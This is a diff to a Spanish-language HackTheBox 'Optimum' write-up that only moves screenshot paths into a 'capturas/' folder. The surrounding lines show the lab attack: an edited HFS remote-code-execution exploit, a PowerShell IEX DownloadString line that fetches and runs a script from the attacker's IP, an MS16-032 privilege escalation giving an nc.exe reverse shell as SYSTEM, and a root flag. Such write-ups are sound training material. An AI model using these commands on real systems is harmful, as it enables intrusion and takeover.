@@ -80,7 +80,7 @@ sudo sed -i 's/lport = 1111/lport = 9001/' /usr/share/exploitdb/exploits/windows
 sudo sed -i 's/rhost = "10.10.10.8"/rhost = "10.129.80.29"/' /usr/share/exploitdb/exploits/windows/remote/49584.py
 ```
 
-![Edición del exploit 49584.py: el primer intento sin sudo falla por permisos, el segundo con sudo funciona](optimum-01-editar-exploit.png)
+![Edición del exploit 49584.py: el primer intento sin sudo falla por permisos, el segundo con sudo funciona](capturas/optimum-01-editar-exploit.png)
 
 Con un listener abierto en el mismo puerto configurado en el script:
 
@@ -91,7 +91,7 @@ python3 /usr/share/exploitdb/exploits/windows/remote/49584.py
 
 El exploit dispara la ejecución remota en el servidor HFS y recibimos una shell como el usuario `kostas`:
 
-![Shell recibida: whoami confirma optimum\kostas](optimum-02-shell-kostas.png)
+![Shell recibida: whoami confirma optimum\kostas](capturas/optimum-02-shell-kostas.png)
 
 Desde ahí, navegamos a `C:\Users\kostas\Desktop` y leemos la primera flag:
 
@@ -142,7 +142,7 @@ find / -name "Invoke-MS16032.ps1" 2>/dev/null
 /usr/share/powershell-empire/empire/server/data/module_source/privesc/Invoke-MS16032.ps1
 ```
 
-![Localizamos el script dentro de los módulos de PowerShell Empire](optimum-03-find-invoke-ms16032.png)
+![Localizamos el script dentro de los módulos de PowerShell Empire](capturas/optimum-03-find-invoke-ms16032.png)
 
 Lo copiamos a nuestro directorio de trabajo, le añadimos al final la invocación concreta (ejecutar `nc.exe` contra nuestra IP) y servimos tanto el script como el binario de `nc.exe` con un servidor HTTP:
 
@@ -158,7 +158,7 @@ Desde la shell de `kostas`, descargamos y ejecutamos el script en memoria:
 IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.120/Invoke-MS16032.ps1')
 ```
 
-![Preparando el privesc: se sirve Invoke-MS16032.ps1 y nc.exe; el log de la derecha muestra las peticiones del objetivo](optimum-04-preparando-privesc.png)
+![Preparando el privesc: se sirve Invoke-MS16032.ps1 y nc.exe; el log de la derecha muestra las peticiones del objetivo](capturas/optimum-04-preparando-privesc.png)
 
 Con un listener abierto en el puerto indicado, el exploit abusa de un *handle* mal gestionado de Secondary Logon para lanzar un proceso con privilegios de `NT AUTHORITY\SYSTEM`, que ejecuta `nc.exe` y nos devuelve una shell de sistema.
 
@@ -168,7 +168,7 @@ Navegamos a `C:\Users\Administrator\Desktop` y leemos la flag final:
 ROOT FLAG -> 6764c494c49eaefddae6b398024f3344
 ```
 
-![Máquina Optimum resuelta en HackTheBox](optimum-05-pwned.png)
+![Máquina Optimum resuelta en HackTheBox](capturas/optimum-05-pwned.png)
 
 ---
 
